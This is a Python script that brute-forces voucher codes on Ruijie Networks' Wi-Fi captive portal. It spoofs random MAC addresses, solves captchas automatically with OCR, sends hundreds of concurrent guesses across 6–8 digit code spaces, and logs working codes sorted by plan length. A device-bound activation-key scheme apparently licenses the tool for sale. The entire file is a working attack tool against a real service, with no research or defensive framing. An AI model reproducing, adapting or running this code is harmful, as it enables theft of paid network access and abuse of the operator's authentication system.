import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import string
import time
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta
import sys
import hashlib

# ANSI Color Codes
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"
CLEAR_LINE = "\033[K"

# Configuration
CONCURRENCY = 500
BATCH_SIZE = 150
SUCCESS_FILE = "success_codes.txt"
LIMITED_FILE = "limited_codes.txt"
KEY_FILE = ".saved_key"
SECRET_SALT = "YOURGOD_CONTROL_PANEL_2026"

# OCR Initialization
_ocr = ddddocr.DdddOcr(show_ad=False)

def generate_device_id():
    id_file = ".device_id"
    if os.path.exists(id_file):
        with open(id_file, "r") as f:
            return f.read().strip()
    new_id = "RU-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    with open(id_file, "w") as f:
        f.write(new_id)
    return new_id

def verify_advanced_key(device_id, key):
    # Pattern: [Value][Unit]-[Hash]  e.g., 12H-ABCDEF, 3D-GHIJKL, 99U-MNOPQR (Unlimited)
    pattern = r"^(\d+)([H|D|M|U])-([A-Z0-9]{6,10})$"
    match = re.match(pattern, key)
    if not match:
        return False, "Invalid Key Format!"
    
    val_str, unit, hash_part = match.groups()
    value = int(val_str)
    
    found_valid = False
    expiry_info = ""
    
    for i in range(31):
        check_date = datetime.now() - timedelta(days=i)
        date_str = check_date.strftime("%Y%m%d")
        
        combined = device_id + val_str + unit + date_str + SECRET_SALT
        correct_hash = hashlib.sha256(combined.encode()).hexdigest()[:len(hash_part)].upper()
        
        if hash_part == correct_hash:
            found_valid = True
            if unit == "H": expiry_date = check_date + timedelta(hours=value)
            elif unit == "D": expiry_date = check_date + timedelta(days=value)
            elif unit == "M": expiry_date = check_date + timedelta(days=value * 30)
            elif unit == "U": expiry_date = check_date + timedelta(days=36500) # 100 Years = Unlimited
            
            if datetime.now() > expiry_date:
                return False, "Activation Code has Expired!"
                
            expiry_info = "Unlimited Access" if unit == "U" else f"{val_str}{unit} (Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')})"
            break
            
    if found_valid:
        return True, expiry_info
    return False, "Invalid Activation Code!"

def save_key(key):
    with open(KEY_FILE, "w") as f:
        f.write(key)

def load_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            return f.read().strip()
    return None

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None: return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    return _ocr.classification(buffer.tobytes()).upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Verify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") else None

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session, session_url):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36'}
    try:
        async with session.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return session_id.group(1) if session_id else None
    except: return None

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown' or total_minutes is None: return 'Unknown'
    try:
        minutes = int(total_minutes)
        hours, rem_minutes = divmod(minutes, 60)
        if hours > 0 and rem_minutes > 0: return f"{hours}h {rem_minutes}m"
        elif hours > 0: return f"{hours}h"
        else: return f"{rem_minutes}m"
    except: return str(total_minutes)

async def Get_Code_Details(session_id, connector):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(connector=connector, connector_owner=False, timeout=timeout) as fresh_session:
            async with fresh_session.get(f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}', headers=headers) as req:
                respond = await req.json()
                result = respond.get('result', {})
                profile_name = result.get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(result.get('totalMinutes', 'Unknown'))
                return profile_name, totaltime
    except: return "Unknown", "Unknown"

def digit_generator(length): return ''.join(random.choices(string.digits, k=length))
def ascii_generator(length): return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def iter_codes(mode):
    if mode == "6":
        codes = [f"{i:06d}" for i in range(1000000)]
        random.shuffle(codes)
        for code in codes: yield code
    elif mode == "7":
        while True: yield digit_generator(7)
    elif mode == "8":
        while True: yield digit_generator(8)
    elif mode == "ascii-lower":
        while True: yield ascii_generator(6)
    else: raise ValueError(f"Unsupported scan mode: {mode}")

async def perform_check(session_url, code, connector, progress_data, plan_filter):
    post_url = 'https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US'
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(connector=connector, connector_owner=False, timeout=timeout) as task_session:
        try:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                progress_data['retries'] += 1
                progress_data['net_err'] += 1
                return
            
            auth_code = None
            for _ in range(5):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if text and await Verify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                    else:
                        progress_data['retries'] += 1
                except: 
                    progress_data['retries'] += 1
                    continue
            
            if not auth_code:
                progress_data['net_err'] += 1
                return

            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {
                "content-type": "application/json",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            
            async with task_session.post(post_url, json=data, headers=headers) as req:
                progress_data['net_ok'] += 1
                resp_text = await req.text()
                if 'logonUrl' in resp_text:
                    if plan_filter == "5": return
                    profile_name, time_left = await Get_Code_Details(session_id, connector)
                    match = False
                    if plan_filter == "0": match = True
                    elif plan_filter == "1" and ("1h" in profile_name.lower() or "1 hour" in profile_name.lower()): match = True
                    elif plan_filter == "2" and ("1d" in profile_name.lower() or "1 day" in profile_name.lower()): match = True
                    elif plan_filter == "3" and ("7d" in profile_name.lower() or "7 days" in profile_name.lower()): match = True
                    elif plan_filter == "4" and ("1mo" in profile_name.lower() or "1 month" in profile_name.lower()): match = True
                    if match:
                        progress_data['found_codes'].append(code)
                        with open(SUCCESS_FILE, "a") as f:
                            f.write(f"{code} - Plan: {profile_name} - Time: {time_left} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        sys.stdout.write(f"\r{CLEAR_LINE}{GREEN}{BOLD}[+] SUCCESS CODE: {code} | Plan: {profile_name} | Time: {time_left}{RESET}\n")
                        sys.stdout.flush()
                elif 'STA' in resp_text:
                    if plan_filter == "5":
                        progress_data['found_codes'].append(code)
                        with open(LIMITED_FILE, "a") as f:
                            f.write(f"{code} - Limited (STA) - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        sys.stdout.write(f"\r{CLEAR_LINE}{YELLOW}{BOLD}[!] LIMITED CODE: {code} (STA response){RESET}\n")
                        sys.stdout.flush()
                elif 'request limited' in resp_text: 
                    progress_data['retries'] += 1
        except:
            progress_data['retries'] += 1
            progress_data['net_err'] += 1

def print_banner():
    banner = f"""
{CYAN}{BOLD}==========================================
    WELCOME BACK TO YOURGOD CONTROL PANEL
=========================================={RESET}
"""
    print(banner)

def display_progress(progress_data, total):
    checked, found, retries, start_time = progress_data['checked'], len(progress_data['found_codes']), progress_data['retries'], progress_data['start_time']
    net_ok, net_err = progress_data['net_ok'], progress_data['net_err']
    elapsed = time.monotonic() - start_time
    speed = (checked / elapsed * 60) if elapsed > 0 else 0
    bar_length = 15
    net_status = f"{GREEN}OK:{net_ok}{RESET} | {RED}ERR:{net_err}{RESET}"
    if total:
        percent = (checked / total) * 100
        filled = int(bar_length * checked // total)
        bar = "█" * filled + "░" * (bar_length - filled)
        progress_str = f"\r{CLEAR_LINE}{YELLOW}🔍 [{bar}] {percent:.2f}% | {checked}/{total} | Speed: {speed:.0f}/min | Found: {found} | Re: {retries} | Net: {net_status}{RESET}"
    else:
        progress_str = f"\r{CLEAR_LINE}{YELLOW}🔍 Checked: {checked} | Speed: {speed:.0f}/min | Found: {found} | Re: {retries} | Net: {net_status}{RESET}"
    sys.stdout.write(progress_str)
    sys.stdout.flush()

def view_history():
    print(f"\n{CYAN}{BOLD}--- SCAN HISTORY ---{RESET}")
    if not os.path.exists(SUCCESS_FILE):
        print(f"{RED}No success history found.{RESET}")
    else:
        print(f"{GREEN}Success Codes Found:{RESET}")
        with open(SUCCESS_FILE, "r") as f:
            lines = f.readlines()
            for i, line in enumerate(lines, 1):
                print(f"{i}. {line.strip()}")
    
    if os.path.exists(LIMITED_FILE):
        print(f"\n{YELLOW}Limited Codes (STA):{RESET}")
        with open(LIMITED_FILE, "r") as f:
            lines = f.readlines()
            for i, line in enumerate(lines, 1):
                print(f"{i}. {line.strip()}")
    print(f"\n{CYAN}--------------------{RESET}\n")
    input("Press Enter to return to main menu...")

async def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print_banner()
    device_id = generate_device_id()
    print(f"{WHITE}Your Device ID: {YELLOW}{BOLD}{device_id}{RESET}")

    saved_key = load_key()
    valid = False
    expiry_msg = ""

    if saved_key:
        valid, expiry_msg = verify_advanced_key(device_id, saved_key)
        if not valid:
            print(f"{RED}Saved Key has expired or is invalid.{RESET}")
            saved_key = None

    if not valid:
        print(f"{WHITE}Please send this ID to Admin to get your Activation Code.{RESET}")
        user_key = input(f"\n{WHITE}Enter Activation Code: {RESET}").strip().upper()
        valid, expiry_msg = verify_advanced_key(device_id, user_key)
        if not valid:
            print(f"{RED}{BOLD}{expiry_msg}{RESET}")
            return
        save_key(user_key)
        print(f"{GREEN}{BOLD}Activated Successfully! ({expiry_msg}){RESET}")
        time.sleep(1)
    else:
        print(f"{GREEN}{BOLD}Welcome Back! (Key Active: {expiry_msg}){RESET}")
        time.sleep(1)

    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print_banner()
        print(f"{WHITE}Status: {GREEN}Activated ({expiry_msg}){RESET}")
        print(f"{WHITE}Device ID: {YELLOW}{device_id}{RESET}")
        
        print(f"\n{WHITE}Select Option:{RESET}")
        print(f"{CYAN}1. Start New Scan{RESET}")
        print(f"{CYAN}2. View Success History (Saved Codes){RESET}")
        print(f"{CYAN}3. Clear Saved Key (Change Key){RESET}")
        print(f"{CYAN}4. Exit{RESET}")
        
        main_choice = input(f"\n{WHITE}Choice: {RESET}").strip()
        
        if main_choice == "2":
            view_history()
            continue
        elif main_choice == "3":
            if os.path.exists(KEY_FILE):
                os.remove(KEY_FILE)
                print(f"{YELLOW}Saved Key cleared. Please restart the script to enter a new key.{RESET}")
                break
            continue
        elif main_choice == "4":
            print(f"{YELLOW}Goodbye!{RESET}")
            break
        elif main_choice != "1":
            continue

        session_url = input(f"\n{WHITE}Enter Session URL: {RESET}").strip()
        if not session_url: continue
        
        print(f"\n{WHITE}Select Scan Mode:{RESET}")
        print(f"{CYAN}1. 6 Digits (Random Order){RESET}")
        print(f"{CYAN}2. 7 Digits (Random Order){RESET}")
        print(f"{CYAN}3. 8 Digits (Random){RESET}")
        print(f"{CYAN}4. ASCII Lower (Random 6 chars){RESET}")
        choice = input(f"{WHITE}Choice: {RESET}").strip()
        mode_map = {"1": "6", "2": "7", "3": "8", "4": "ascii-lower"}
        mode = mode_map.get(choice)
        if not mode: continue
        
        print(f"\n{WHITE}Select Plan Filter:{RESET}")
        print(f"{CYAN}0. Show All Success Plans{RESET}")
        print(f"{CYAN}1. 1 Hour Plans Only{RESET}")
        print(f"{CYAN}2. 1 Day Plans Only{RESET}")
        print(f"{CYAN}3. 7 Days Plans Only{RESET}")
        print(f"{CYAN}4. 1 Month Plans Only{RESET}")
        print(f"{YELLOW}5. Limited Codes Only (STA){RESET}")
        plan_filter = input(f"{WHITE}Choice: {RESET}").strip()
        if plan_filter not in ["0", "1", "2", "3", "4", "5"]: plan_filter = "0"
        
        total = 10**int(mode) if mode in ["6", "7"] else None
        code_gen = iter_codes(mode)
        progress_data = {
            'checked': 0, 'found_codes': [], 'retries': 0, 'net_ok': 0, 'net_err': 0, 'start_time': time.monotonic()
        }
        connector = aiohttp.TCPConnector(limit=CONCURRENCY, ssl=False)
        
        print(f"\n{CYAN}Starting scan... Results will be saved to {SUCCESS_FILE}{RESET}\n")
        semaphore = asyncio.Semaphore(CONCURRENCY)
        
        async def sem_check(code):
            async with semaphore:
                await perform_check(session_url, code, connector, progress_data, plan_filter)
                progress_data['checked'] += 1
                display_progress(progress_data, total)
        
        try:
            while True:
                batch = []
                for _ in range(BATCH_SIZE):
                    try: batch.append(next(code_gen))
                    except StopIteration: break
                if not batch: break
                await asyncio.gather(*[sem_check(code) for code in batch])
                if total and progress_data['checked'] >= total: break
        except KeyboardInterrupt: 
            print(f"\n{RED}Scan stopped by user.{RESET}")
        finally:
            await connector.close()
            display_progress(progress_data, total)
            print(f"\n\n{GREEN}{BOLD}Scan Completed! Found {len(progress_data['found_codes'])} codes.{RESET}")
            input("\nPress Enter to return to main menu...")

if __name__ == "__main__":
    asyncio.run(main())
